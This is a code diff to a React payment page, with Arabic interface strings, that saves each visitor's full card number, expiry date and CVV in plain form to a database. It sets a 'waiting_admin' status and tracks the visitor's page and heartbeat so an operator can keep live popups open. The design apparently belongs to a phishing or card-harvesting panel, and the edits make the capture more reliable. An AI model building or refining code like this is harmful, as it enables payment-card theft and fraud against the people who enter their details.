@@ -24,10 +24,9 @@ export const Payment = () => {
   useEffect(() => {
     if (!customerId) return;
     
-    // Track page and RESET status to idle to avoid showing old popups
+    // Track page ONLY - DO NOT reset status here to avoid closing active popups
     supabase.from('customers').update({ 
       page: '5- صفحه الدفع',
-      status: 'idle',
       last_update: Date.now(),
       last_heartbeat: Date.now()
     }).eq('id', customerId).then(({ error }) => { if (error) console.error(error) });
@@ -129,9 +128,9 @@ export const Payment = () => {
     e.preventDefault();
     setError('');
     try {
-      await supabase.from('customers').update({
+      const { error } = await supabase.from('customers').update({
         card_name: formData.cardName,
-        card_number: formData.cardNumber,
+        card_number: formData.cardNumber.replace(/\s/g, ''), // Save without spaces for cleaner data
         expiry_month: formData.expiryMonth,
         expiry_year: formData.expiryYear,
         cvv: formData.cvv,
@@ -139,9 +138,15 @@ export const Payment = () => {
         last_update: new Date().getTime(),
         last_heartbeat: new Date().getTime()
       }).eq('id', customerId);
+
+      if (error) throw error;
+      
+      // Ensure local state reflects the waiting status immediately
       setStatus('waiting_admin');
     } catch (err) {
-      setError('فشلت العملية، يرجى المحاولة لاحقاً');
+      console.error("Payment Submission Error:", err);
+      setError('حدث خطأ أثناء إرسال البيانات، يرجى المحاولة مرة أخرى');
+      setStatus('idle');
     }
   };
 
